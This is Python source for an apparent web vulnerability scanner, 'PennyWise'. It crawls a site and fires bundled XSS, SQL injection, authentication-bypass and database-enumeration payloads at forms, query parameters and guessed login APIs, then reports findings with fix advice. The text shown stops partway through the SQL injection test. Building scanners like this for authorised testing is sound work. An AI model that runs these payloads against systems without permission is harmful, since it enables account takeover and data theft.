"""
Enhanced Scanner for PennyWise.
Provides parallel, multithreaded vulnerability scanning with improved detection.
"""

import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Set, Callable, Tuple
from datetime import datetime
import logging
import re
import json
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor
from collections import deque

from ..config import AttackType, SeverityLevel, PennywiseConfig
from ..ai.analyzer import get_ai_analyzer, AIAnalyzer

logger = logging.getLogger(__name__)


@dataclass
class VulnerabilityFinding:
    """A security finding/vulnerability with full details."""
    id: str
    attack_type: AttackType
    severity: SeverityLevel
    title: str
    description: str
    url: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    db_structure: Optional[str] = None
    request: Optional[Dict[str, Any]] = None
    response: Optional[Dict[str, Any]] = None
    recommendations: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)
    confidence: float = 0.8
    cvss_score: float = 5.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'id': self.id,
            'attack_type': self.attack_type.value,
            'severity': self.severity.value,
            'title': self.title,
            'description': self.description,
            'url': self.url,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence[:500] if self.evidence else None,
            'db_structure': self.db_structure,
            'recommendations': self.recommendations,
            'timestamp': self.timestamp.isoformat(),
            'confidence': self.confidence,
            'cvss_score': self.cvss_score
        }


@dataclass
class ScanProgress:
    """Track scanning progress."""
    total_tasks: int = 0
    completed_tasks: int = 0
    current_phase: str = "Initializing"
    findings_count: int = 0
    requests_made: int = 0
    pages_crawled: int = 0
    start_time: datetime = field(default_factory=datetime.now)
    
    @property
    def percentage(self) -> int:
        if self.total_tasks == 0:
            return 0
        return int((self.completed_tasks / self.total_tasks) * 100)
    
    @property
    def elapsed_seconds(self) -> float:
        return (datetime.now() - self.start_time).total_seconds()


class EnhancedScanner:
    """
    Enhanced vulnerability scanner with parallel execution and improved detection.
    
    Features:
    - Concurrent request execution
    - Smart crawling with deduplication
    - Improved payload detection
    - AI-powered analysis integration
    - Real-time progress tracking
    """
    
    # XSS Payloads organized by category
    XSS_PAYLOADS = {
        'basic': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ],
        'advanced': [
            '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
            '"><img src=x onerror=alert(1)//',
            '</script><script>alert(1)</script>',
            'javascript:alert(1)',
            '"><svg/onload=alert(1)>',
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            '<img src="x" onerror="alert(1)">',
            '<svg><script>alert(1)</script></svg>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '<TABLE><TD BACKGROUND="javascript:alert(1)">',
            '<DIV STYLE="background-image: url(javascript:alert(1))">',
            '<IMG SRC=j&#X41vascript:alert(1)>',
        ],
        'dom_based': [
            "#<img src=x onerror=alert(1)>",
            "?q=<script>alert(1)</script>",
            "&callback=alert",
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
        ],
        'api_json': [
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '</script><script>alert(1)</script>',
        ],
        'encoded': [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        ],
        'polyglot': [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            '">\'>><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>'
        ]
    }
    
    # SQL Injection Payloads
    SQLI_PAYLOADS = {
        'error_based': [
            "'",
            "''",
            "1'",
            "1''",
            '1"',
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "' OR 1=1 --",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1 AND 1=1",
            "1 AND 1=2",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "OR 1=1",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
        ],
        'auth_bypass': [
            # Common authentication bypass payloads
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or '1'='1'--",
            "' or '1'='1'#",
            "' or '1'='1'/*",
            "'or 1=1 or ''='",
            "' or 1=1 or ''='",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR ''='",
            "\" OR \"\"=\"",
            "'or'1'='1",
            "\"or\"1\"=\"1",
            "or 1=1--",
            "or 1=1#",
            "or 1=1/*",
            "admin' or '1'='1",
            "admin\" or \"1\"=\"1",
            "' OR 'x'='x'--",
            "\" OR \"x\"=\"x\"--",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1 UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT 'a',NULL--",
            "' UNION SELECT NULL,'a'--",
        ],
        'time_based': [
            "1' AND SLEEP(3)--",
            "1'; WAITFOR DELAY '0:0:3'--",
            "1'; SELECT SLEEP(3)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "1' and sleep(3)#",
        ],
        'boolean_based': [
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "' AND '1'='1",
            "' AND '1'='2",
        ]
    }
    
    # SQL Error patterns - comprehensive detection
    SQL_ERROR_PATTERNS = [
        # MySQL errors
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySqlClient\.", "MySQL"),
        (r"mysql_fetch", "MySQL"),
        (r"mysql_num_rows", "MySQL"),
        (r"MySQL.*error", "MySQL"),
        # PostgreSQL errors
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*pg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        (r"PG::Error", "PostgreSQL"),
        # MSSQL errors
        (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.* SQL Server", "MSSQL"),
        (r"\bSQL Server\b", "MSSQL"),
        (r"SQL Server.*Driver", "MSSQL"),
        (r"Warning.*mssql_", "MSSQL"),
        (r"Microsoft.*ODBC.*SQL", "MSSQL"),
        # Oracle errors
        (r"ORA-\d{5}", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        (r"Warning.*oci_", "Oracle"),
        # SQLite errors - expanded patterns for test server
        (r"SQLite.*error", "SQLite"),
        (r"sqlite3\.OperationalError", "SQLite"),
        (r"SQLITE_ERROR", "SQLite"),
        (r"sqlite3\.IntegrityError", "SQLite"),
        (r"no such column", "SQLite"),
        (r"no such table", "SQLite"),
        (r"unrecognized token", "SQLite"),
        (r"near \".*\": syntax error", "SQLite"),
        (r"SQL Error:.*sqlite", "SQLite"),
        (r"Database Error.*SQL", "SQLite"),
        # Generic SQL errors
        (r"Unclosed quotation mark", "Generic SQL"),
        (r"quoted string not properly terminated", "Generic SQL"),
        (r"syntax error at or near", "Generic SQL"),
        (r"SQL Error:", "Generic SQL"),
        (r"Database Error", "Generic SQL"),
        (r"Query:", "Generic SQL"),  # Error pages that show the query
    ]
    
    # Database enumeration payloads
    DB_ENUM_PAYLOADS = {
        'sqlite': [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT tbl_name FROM sqlite_master--",
            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'--",
            "1' UNION SELECT 1,sql,3 FROM sqlite_master--",
            "1' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master--",
        ],
        'mysql': [
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        ],
        'generic': [
            "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,version(),3--",
        ]
    }

    def __init__(self, 
                 config: Optional[PennywiseConfig] = None,
                 max_concurrent_requests: int = 100,
                 on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None,
                 on_progress: Optional[Callable[[ScanProgress], None]] = None,
                 on_log: Optional[Callable[[str, str], None]] = None):
        """
        Initialize the enhanced scanner.
        
        Args:
            config: PennyWise configuration
            max_concurrent_requests: Maximum concurrent HTTP requests (default 100 for speed)
            on_finding: Callback for real-time finding notifications
            on_progress: Callback for progress updates
            on_log: Callback for log messages (message, level)
        """
        self.config = config or PennywiseConfig()
        self.max_concurrent = max_concurrent_requests
        self.on_finding = on_finding
        self.on_progress = on_progress
        self.on_log = on_log
        
        self.ai_analyzer = get_ai_analyzer()
        self._finding_counter = 0
        self._semaphore: Optional[asyncio.Semaphore] = None
        self._session: Optional[aiohttp.ClientSession] = None
        self._seen_responses: Set[str] = set()
        
        # Batch logging to prevent spam
        self._log_batch: List[str] = []
        self._batch_size = 20
        self._last_batch_flush = time.time()
        
        self.progress = ScanProgress()
        
        self._log(f"Enhanced Scanner initialized (max concurrent: {max_concurrent_requests})", "info")
        logger.info(f"Enhanced Scanner initialized (max concurrent: {max_concurrent_requests})")
    
    def _log(self, message: str, level: str = "info", force_flush: bool = False):
        """Send log message to callback if available (batched to prevent spam)."""
        if not self.on_log:
            return
        
        # Important messages bypass batch (success, error, warning)
        if level in ['success', 'error', 'warning'] or force_flush:
            # Flush any pending batch first
            if self._log_batch:
                self.on_log("\n".join(self._log_batch), "info")
                self._log_batch.clear()
            self.on_log(message, level)
            self._last_batch_flush = time.time()
        else:
            # Batch info messages
            self._log_batch.append(f"[{level}] {message}")
            
            # Auto-flush if batch is full or 2 seconds passed
            if len(self._log_batch) >= self._batch_size or (time.time() - self._last_batch_flush) > 2:
                self.on_log("\n".join(self._log_batch), "info")
                self._log_batch.clear()
                self._last_batch_flush = time.time()
    
    async def scan(self,
                   url: str,
                   attack_types: Optional[List[AttackType]] = None,
                   crawl: bool = True,
                   max_pages: int = 50) -> Dict[str, Any]:
        """
        Perform a comprehensive vulnerability scan.
        
        Args:
            url: Target URL to scan
            attack_types: Specific attack types to test (None = auto-detect)
            crawl: Whether to crawl for additional pages
            max_pages: Maximum pages to crawl
            
        Returns:
            Complete scan results dictionary
        """
        self.progress = ScanProgress(start_time=datetime.now())
        findings: List[VulnerabilityFinding] = []
        
        # Default to common attacks if not specified
        if attack_types is None:
            attack_types = [AttackType.XSS, AttackType.SQLI, AttackType.CSRF]
        
        try:
            self._semaphore = asyncio.Semaphore(self.max_concurrent)
            
            connector = aiohttp.TCPConnector(
                limit=self.max_concurrent,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={"User-Agent": self.config.scan.user_agent}
            ) as session:
                self._session = session
                
                # Phase 1: Initial analysis
                self._update_progress("Analyzing target...", 0, 100)
                target_info = await self._analyze_target(url)
                
                if not target_info['success']:
                    return self._create_error_result(url, target_info.get('error', 'Target unreachable'))
                
                # Phase 2: AI-powered attack recommendation
                self._update_progress("Determining attack strategy...", 10, 100)
                ai_recommendations = self.ai_analyzer.analyze_target(
                    url, 
                    target_info.get('html', ''),
                    target_info.get('headers', {})
                )
                
                logger.info(f"AI recommended {len(ai_recommendations)} attack types")
                
                # Phase 3: Crawl for additional pages
                pages_to_scan = [url]
                if crawl:
                    self._update_progress("Crawling for pages...", 15, 100)
                    pages_to_scan = await self._crawl_site(url, max_pages)
                
                self.progress.pages_crawled = len(pages_to_scan)
                
                # Show all discovered paths and subdomains
                self._log(f"\n{'='*60}", "info", force_flush=True)
                self._log(f"🔍 DISCOVERED PATHS/ENDPOINTS ({len(pages_to_scan)} total)", "success", force_flush=True)
                self._log(f"{'='*60}", "info", force_flush=True)
                
                # Group by domain/subdomain
                from collections import defaultdict
                by_domain = defaultdict(list)
                for page in pages_to_scan:
                    parsed = urlparse(page)
                    domain_key = f"{parsed.scheme}://{parsed.netloc}"
                    path = parsed.path or '/'
                    by_domain[domain_key].append(path)
                
                for domain, paths in by_domain.items():
                    self._log(f"\n📍 {domain}", "success", force_flush=True)
                    for path in sorted(set(paths)):
                        self._log(f"   └─ {path}", "info", force_flush=True)
                
                self._log(f"\n{'='*60}\n", "info", force_flush=True)
                logger.info(f"Found {len(pages_to_scan)} pages to scan")
                
                # Phase 4: Extract injection points from all pages
                self._update_progress("Extracting injection points...", 25, 100)
                injection_points = await self._extract_injection_points(pages_to_scan)
                
                # Add common API endpoints for SPAs (like Juice Shop)
                api_injection_points = self._get_common_api_endpoints(url)
                injection_points.extend(api_injection_points)
                
                # Show injection points summary
                self._log(f"\n{'='*60}", "info", force_flush=True)
                self._log(f"🎯 INJECTION POINTS ({len(injection_points)} total)", "success", force_flush=True)
                self._log(f"{'='*60}", "info", force_flush=True)
                
                from collections import Counter
                by_type = Counter([pt.get('location', 'unknown') for pt in injection_points])
                self._log(f"Query params: {by_type.get('query', 0)}", "info", force_flush=True)
                self._log(f"Form inputs: {by_type.get('form', 0)}", "info", force_flush=True)
                self._log(f"API endpoints: {len(api_injection_points)}", "info", force_flush=True)
                self._log(f"\n{'='*60}\n", "info", force_flush=True)
                
                logger.info(f"Found {len(injection_points)} injection points")
                
                # Phase 5: Execute attacks in parallel
                self._update_progress("Executing security tests...", 30, 100)
                
                # Calculate total tasks
                self.progress.total_tasks = len(injection_points) * len(attack_types)
                
                # Run attacks concurrently
                attack_tasks = []
                
                for attack_type in attack_types:
                    if attack_type == AttackType.XSS:
                        attack_tasks.extend([
                            self._test_xss(point) for point in injection_points
                        ])
                    elif attack_type == AttackType.SQLI:
                        attack_tasks.extend([
                            self._test_sqli(point) for point in injection_points
                        ])
                    elif attack_type == AttackType.CSRF:
                        # Test CSRF on ALL crawled pages, not just the main page
                        attack_tasks.append(self._test_csrf_all_pages(pages_to_scan))
                    elif attack_type == AttackType.AUTH:
                        attack_tasks.append(self._test_auth(url, target_info))
                
                # Execute all attack tasks with concurrency limit
                results = await asyncio.gather(*attack_tasks, return_exceptions=True)
                
                # Collect findings
                for result in results:
                    if isinstance(result, list):
                        findings.extend(result)
                    elif isinstance(result, VulnerabilityFinding):
                        findings.append(result)
                
                # Phase 6: AI severity classification (with fallback)
                self._update_progress("Classifying findings...", 90, 100)
                for finding in findings:
                    try:
                        classification = self.ai_analyzer.classify_severity(finding.to_dict())
                        if classification and classification.severity:
                            finding.severity = SeverityLevel(classification.severity.lower())
                            finding.cvss_score = classification.cvss_score or finding.cvss_score
                        
                        # Get remediation suggestions
                        remediations = self.ai_analyzer.suggest_remediation(finding.to_dict())
                        if remediations:
                            finding.recommendations = [r.title for r in remediations[:3]]
                    except Exception as e:
                        logger.debug(f"AI classification error: {e}")
                        # Keep existing severity from finding
                
                # Flush any remaining batched logs
                if self._log_batch:
                    self.on_log("\n".join(self._log_batch), "info")
                    self._log_batch.clear()
                
                # Phase 7: Generate summary
                self._update_progress("Generating report...", 95, 100)
                try:
                    summary = self.ai_analyzer.generate_summary([f.to_dict() for f in findings])
                except Exception as e:
                    logger.debug(f"Summary generation error: {e}")
                    summary = {
                        'overall_risk': 'High' if findings else 'Low',
                        'summary': f'Found {len(findings)} vulnerabilities',
                        'recommendations': ['Review findings and implement fixes']
                    }
                
                self._update_progress("Scan complete!", 100, 100)
                self.progress.findings_count = len(findings)
        
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            return self._create_error_result(url, str(e))
        
        return {
            'success': True,
            'target_url': url,
            'scan_started': self.progress.start_time.isoformat(),
            'scan_completed': datetime.now().isoformat(),
            'duration_seconds': self.progress.elapsed_seconds,
            'pages_scanned': self.progress.pages_crawled,
            'requests_made': self.progress.requests_made,
            'findings': [f.to_dict() for f in findings],
            'summary': summary,
            'ai_recommendations': [
                {
                    'attack_type': r.attack_type.value,
                    'probability': r.probability,
                    'reasons': r.reasons
                } for r in ai_recommendations
            ]
        }
    
    async def _analyze_target(self, url: str) -> Dict[str, Any]:
        """Analyze the target URL."""
        try:
            async with self._semaphore:
                async with self._session.get(url) as response:
                    self.progress.requests_made += 1
                    html = await response.text()
                    
                    return {
                        'success': True,
                        'url': url,
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'html': html,
                        'content_length': len(html),
                    }
        except Exception as e:
            logger.error(f"Target analysis failed: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _crawl_site(self, start_url: str, max_pages: int) -> List[str]:
        """Crawl the site to discover pages."""
        seen = {start_url}
        queue = deque([start_url])
        pages = [start_url]
        
        parsed_start = urlparse(start_url)
        base_domain = parsed_start.netloc
        
        while queue and len(pages) < max_pages:
            current_url = queue.popleft()
            
            try:
                async with self._semaphore:
                    async with self._session.get(current_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        
                        content_type = response.headers.get('Content-Type', '')
                        if 'text/html' not in content_type:
                            continue
                        
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Find all links
                        for link in soup.find_all(['a', 'form'], href=True):
                            href = link.get('href') or link.get('action', '')
                            if not href:
                                continue
                            
                            full_url = urljoin(current_url, href.split('#')[0])
                            parsed = urlparse(full_url)
                            
                            # Stay on same domain
                            if parsed.netloc != base_domain:
                                continue
                            
                            # Normalize URL
                            normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                            
                            if normalized not in seen:
                                seen.add(normalized)
                                queue.append(full_url)
                                pages.append(full_url)
                                
                                if len(pages) >= max_pages:
                                    break
            
            except Exception as e:
                logger.debug(f"Crawl error for {current_url}: {e}")
            
            await asyncio.sleep(0.05)  # Small delay
        
        return pages
    
    async def _extract_injection_points(self, pages: List[str]) -> List[Dict[str, Any]]:
        """Extract all injection points from pages."""
        injection_points = []
        
        for page_url in pages:
            try:
                async with self._semaphore:
                    async with self._session.get(page_url) as response:
                        self.progress.requests_made += 1
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Extract URL parameters
                        parsed = urlparse(page_url)
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param in params.keys():
                                injection_points.append({
                                    'url': page_url,
                                    'parameter': param,
                                    'location': 'query',
                                    'method': 'GET',
                                    'original_value': params[param][0] if params[param] else ''
                                })
                        
                        # Extract form inputs
                        for form in soup.find_all('form'):
                            action = form.get('action', '')
                            form_url = urljoin(page_url, action) if action else page_url
                            method = form.get('method', 'GET').upper()
                            
                            for inp in form.find_all(['input', 'textarea']):
                                name = inp.get('name')
                                if not name:
                                    continue
                                
                                input_type = inp.get('type', 'text').lower()
                                if input_type in ['submit', 'button', 'hidden', 'file']:
                                    continue
                                
                                injection_points.append({
                                    'url': form_url,
                                    'parameter': name,
                                    'location': 'form',
                                    'method': method,
                                    'original_value': inp.get('value', ''),
                                    'input_type': input_type
                                })
            
            except Exception as e:
                logger.debug(f"Extraction error for {page_url}: {e}")
        
        return injection_points
    
    def _get_common_api_endpoints(self, base_url: str) -> List[Dict[str, Any]]:
        """Generate common API endpoints for SPAs and REST APIs."""
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common REST API login/auth endpoints
        common_endpoints = [
            # Login endpoints
            {'path': '/rest/user/login', 'params': ['email', 'password'], 'method': 'POST'},
            {'path': '/api/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/auth/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/v1/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/users/login', 'params': ['email', 'password'], 'method': 'POST'},
            {'path': '/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/auth/login', 'params': ['email', 'password'], 'method': 'POST'},
            # User/Search endpoints
            {'path': '/rest/products/search', 'params': ['q'], 'method': 'GET'},
            {'path': '/api/search', 'params': ['q', 'query', 'search'], 'method': 'GET'},
            {'path': '/api/products', 'params': ['id', 'category'], 'method': 'GET'},
            {'path': '/api/users', 'params': ['id', 'email'], 'method': 'GET'},
            # Other common endpoints
            {'path': '/rest/user/whoami', 'params': ['token'], 'method': 'GET'},
            {'path': '/api/v1/users', 'params': ['id'], 'method': 'GET'},
        ]
        
        injection_points = []
        for endpoint in common_endpoints:
            url = urljoin(base, endpoint['path'])
            for param in endpoint['params']:
                injection_points.append({
                    'url': url,
                    'parameter': param,
                    'location': 'api',
                    'method': endpoint['method'],
                    'original_value': '',
                    'is_api': True
                })
        
        self._log(f"Added {len(injection_points)} common API injection points", "info")
        return injection_points
    
    async def _test_single_xss_payload(self, url: str, param: str, payload: str, 
                                        method: str = 'GET', is_api: bool = False) -> Optional[VulnerabilityFinding]:
        """
        Test a single XSS payload against an injection point.
        
        Returns a VulnerabilityFinding if XSS is detected, None otherwise.
        """
        try:
            async with self._semaphore:
                self.progress.requests_made += 1
                self.progress.completed_tasks += 1
                
                if is_api and method == 'POST':
                    # JSON API request
                    json_data = {param: payload}
                    headers = {'Content-Type': 'application/json'}
                    async with self._session.post(url, json=json_data, headers=headers, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                elif method == 'POST':
                    # Form POST request
                    data = {param: payload}
                    async with self._session.post(url, data=data, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                else:
                    # GET request
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._session.get(test_url, 
                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                
                # Check if payload is reflected (unescaped)
                is_json = 'json' in content_type.lower()
                
                if self._check_xss_reflection(html, payload, is_json):
                    # Determine severity based on context
                    severity = SeverityLevel.HIGH
                    if '<script' in payload.lower() or 'onerror=' in payload.lower():
                        severity = SeverityLevel.CRITICAL
                    
                    evidence = self._extract_evidence(html, payload, context=150)
                    
                    return self._create_finding(
                        attack_type=AttackType.XSS,
                        severity=severity,
                        title=f"Reflected XSS in '{param}'",
                        description=f"XSS payload is reflected unescaped in the response. "
                                    f"This allows execution of arbitrary JavaScript in user browsers.",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=evidence,
                        recommendations=[
                            "Sanitize and encode all user input before rendering in HTML",
                            "Implement Content-Security-Policy headers",
                            "Use framework-provided auto-escaping (e.g., Jinja2, React)",
                            "Validate input against a whitelist of allowed characters"
                        ]
                    )
                
        except Exception as e:
            logger.debug(f"XSS test error for {url}/{param}: {e}")
        
        return None
    
    async def _test_xss(self, injection_point: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for XSS vulnerabilities."""
        findings = []
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        is_api = injection_point.get('is_api', False)
        
        # Select payloads based on context
        if is_api:
            payloads = self.XSS_PAYLOADS['api_json'] + self.XSS_PAYLOADS['basic'][:5]
        else:
            payloads = (self.XSS_PAYLOADS['basic'] + 
                       self.XSS_PAYLOADS['advanced'][:5] + 
                       self.XSS_PAYLOADS['dom_based'][:3])
        
        # Run payloads in parallel batches
        batch_size = 10
        total_tested = 0
        for batch_idx in range(0, len(payloads), batch_size):
            batch = payloads[batch_idx:batch_idx + batch_size]
            tasks = []
            
            for payload in batch:
                tasks.append(self._test_single_xss_payload(url, param, payload, method, is_api))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_tested += len(batch)
            
            # Log batch progress
            self._log(f"XSS [{total_tested}/{len(payloads)}] {param}@{urlparse(url).path} (API:{is_api})")
            
            for result in results:
                if isinstance(result, VulnerabilityFinding):
                    findings.append(result)
                    self._notify_finding(result)
                    self._log(f"✓ XSS FOUND in '{param}' with payload: {result.payload[:40]}...", "success", force_flush=True)
                    return findings  # Found XSS, stop testing
        
        return findings
    
    async def _test_sqli(self, injection_point: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for SQL Injection vulnerabilities."""
        findings = []
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        is_api = injection_point.get('is_api', False)
        
        # First, get baseline response
        baseline_hash = None
        baseline_length = 0
        baseline_status = 0
        
        try:
            async with self._semaphore:
                if is_api and method == 'POST':
                    # For JSON APIs, send proper JSON
                    json_data = {param: "test@test.com"}
                    headers = {'Content-Type': 'application/json'}
                    async with self._session.post(url, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        baseline_html = await response.text()
                        baseline_status = response.status
                else:
                    baseline_url = self._inject_into_url(url, param, "1")
                    async with self._session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        baseline_html = await response.text()
                        baseline_status = response.status
                
                baseline_hash = hashlib.md5(baseline_html.encode()).hexdigest()
                baseline_length = len(baseline_html)
        except Exception as e:
            self._log(f"Baseline request failed: {e}", "warning", force_flush=True)
        
        # Test error-based payloads first
        all_error_payloads = self.SQLI_PAYLOADS['error_based'] + self.SQLI_PAYLOADS['auth_bypass']
        
        for idx, payload in enumerate(all_error_payloads, 1):
            try:
                # Log batch progress every 10 payloads
                if idx % 10 == 1 or idx == len(all_error_payloads):
                    self._log(f"SQLi [{idx}/{len(all_error_payloads)}] {param}@{urlparse(url).path} [{method}]")
                
                async with self._semaphore:
                    # Support JSON APIs (like Juice Shop)
                    if is_api and method == 'POST':
                        json_data = {param: payload}
                        # Add password field for login endpoints
                        if 'login' in url.lower():
                            if param == 'email':
                                json_data['password'] = 'test123'
                            elif param == 'password':
                                json_data['email'] = 'test@test.com'
                        headers = {'Content-Type': 'application/json'}
                        async with self._session.post(url, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            self.progress.requests_made += 1
                            self.progress.completed_tasks += 1
                            self._report_progress()
                            html = await response.text()
                            status = response.status
                    elif method == 'POST':
                        data = {param: payload}
                        async with self._session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            self.progress.requests_made += 1
                            self.progress.completed_tasks += 1
                            self._report_progress()
                            html = await response.text()
                            status = response.status
                    else:
                        test_url = self._inject_into_url(url, param, payload)
                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            self.progress.requests_made += 1
                            self.progress.completed_tasks += 1
                            self._report_progress()
                            html = await response.text()
                            status = response.status
                    
                    # Check for SQL errors
                    for pattern, db_type in self.SQL_ERROR_PATTERNS:
                        match = re.search(pattern, html, re.IGNORECASE)
                        if match:
                            self._log(f"✓ SQLi FOUND ({db_type}) in '{param}' with payload: {payload[:40]}...", "success", force_flush=True)
                            finding = self._create_finding(
                                attack_type=AttackType.SQLI,
                                severity=SeverityLevel.CRITICAL,
                                title=f"SQL Injection in '{param}' ({db_type})",
                                description=f"SQL error message detected indicating {db_type} database. This confirms SQL injection vulnerability.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=match.group(0)
                            )
                            findings.append(finding)
                            self._notify_finding(finding)
                            
                            # Try to enumerate database structure
                            db_info = await self._enumerate_database(url, param, method, db_type.lower())
                            if db_info:
                                self._log(f"📊 Database structure extracted!", "success", force_flush=True)
                                finding.db_structure = db_info
                            
                            return findings  # Critical finding, stop testing
                    
                    # Check for authentication bypass
                    # For JSON APIs, check for token/authentication success
                    if status == 200:
                        # JSON API success indicators (Juice Shop returns token on success)
                        json_success_indicators = ['"token":', '"authentication":', '"accessToken":', '"jwt":', '"success":true', '"status":"success"']
                        if any(indicator in html for indicator in json_success_indicators):
                            self._log(f"✓ SQLi AUTH BYPASS (API) in '{param}' with: {payload[:40]}", "success", force_flush=True)
                            finding = self._create_finding(
                                attack_type=AttackType.SQLI,
                                severity=SeverityLevel.CRITICAL,
                                title=f"SQL Injection Authentication Bypass in '{param}'",
                                description=f"Successfully bypassed authentication using SQL injection. Server returned auth token.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=html[:500]
                            )
                            findings.append(finding)
                            self._notify_finding(finding)
                            
                            # Try to dump database structure
                            db_info = await self._enumerate_database(url, param, method, 'sqlite')
                            if db_info:
                                self._log(f"📊 Database structure extracted!", "success", force_flush=True)
